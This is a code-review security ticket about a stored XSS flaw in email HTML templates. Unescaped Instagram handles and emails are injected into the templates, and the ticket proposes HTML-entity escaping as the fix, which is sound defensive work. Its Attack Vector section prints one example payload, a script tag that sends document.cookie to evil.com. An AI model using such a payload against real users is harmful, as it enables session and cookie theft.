# XSS Vulnerability in Email HTML Templates

## Metadata
- **Status:** complete
- **Priority:** P1 (Critical)
- **Issue ID:** 001
- **Tags:** security, code-review, email
- **Dependencies:** None

## Problem Statement

User-controlled data (`user.instagram`, `user.email`) is directly injected into HTML email templates without sanitization. This creates a Stored XSS vulnerability that could affect all email recipients.

**Why it matters:** An attacker could register with a malicious Instagram handle containing JavaScript, which would execute in recipients' email clients.

## Findings

**Location:** `gas/DailyManager.gs:186-194`

```javascript
sendBatchEmails(users, template.subject, (user) => {
  let html = template.html;

  // Variables injected without sanitization
  html = html.replace(/{{link}}/g, sheetUrl);
  html = html.replace(/{{name}}/g, user.instagram || '멤버');  // XSS vector
  html = html.replace(/{{email}}/g, user.email);               // XSS vector

  return html;
});
```

**Attack Vector:** An attacker could register with:
```
@user<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

## Proposed Solutions

### Option A: HTML Entity Encoding (Recommended)
Add a helper function to escape HTML entities before template substitution.

```javascript
function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Usage
html = html.replace(/{{name}}/g, escapeHtml(user.instagram || '멤버'));
html = html.replace(/{{email}}/g, escapeHtml(user.email));
```

- **Pros:** Simple, effective, no dependencies
- **Cons:** Must remember to use for all user input
- **Effort:** Small
- **Risk:** Low

### Option B: Input Validation on Registration
Validate Instagram handles on registration to reject special characters.

- **Pros:** Prevents bad data at source
- **Cons:** Doesn't protect against existing bad data
- **Effort:** Medium
- **Risk:** Medium

## Recommended Action
Implement Option A (HTML Entity Encoding)

## Technical Details

**Affected Files:**
- `gas/DailyManager.gs` - Line 186-194
- `gas/Utils.gs` - Add `escapeHtml()` helper

## Acceptance Criteria

- [ ] `escapeHtml()` function added to Utils.gs
- [ ] All user-controlled template variables escaped before substitution
- [ ] Test with malicious input like `<script>alert(1)</script>`
- [ ] No XSS possible in rendered emails

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-01-15 | Issue identified in code review | User input must always be escaped before HTML injection |
| 2026-01-15 | Approved during triage | Status: pending → ready. Critical security fix approved for immediate work. |

## Resources

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
